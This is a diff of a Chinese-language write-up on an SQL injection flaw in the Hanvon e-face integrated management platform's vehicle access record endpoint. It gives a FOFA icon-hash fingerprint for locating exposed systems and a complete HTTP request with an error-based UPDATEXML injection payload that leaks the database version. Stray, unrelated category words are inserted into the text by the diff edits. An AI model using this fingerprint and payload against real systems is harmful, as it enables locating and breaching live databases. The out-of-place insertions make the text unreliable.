@@ -17,8 +17,6 @@ V1.6.x
 # fofa语法
 
 > icon\_hash="1380907357"
->
-> 软件
 
 # 漏洞分析
 
@@ -67,7 +65,7 @@ List<VehicleAccessRecord> queryVehicleAccessRecord(VehicleAccessRecordParam var1
 
 和 [汉王e脸通综合管理平台 queryManyPeopleGroupList.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-queryManyPeopleGroupList-sqli.html) 处理逻辑差不多，直接看对应的 mapper xml文件 VehicleAccessRecordVesm.xml
 
-计算机安全
+软件
 
 ```
 <!--查询视图-->
@@ -104,7 +102,7 @@ List<VehicleAccessRecord> queryVehicleAccessRecord(VehicleAccessRecordParam var1
 
 > 本地复现没有 v\_car\_passrecord 这个表
 >
-> 数据管理
+> 计算机安全
 
 ```
 GET /manage/vehicleAccessRecord/queryVehicleAccessRecord.do?branchId=1&columnKey=AND+(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(2920=2920,1)))),8357))&deviceName=test&id=1&order=desc&page=1&pageSize=10&recoToken=SGUsqvF7cVS&type=1&start=2025-06-25&end=2025-06-25&sn=111111 HTTP/1.1
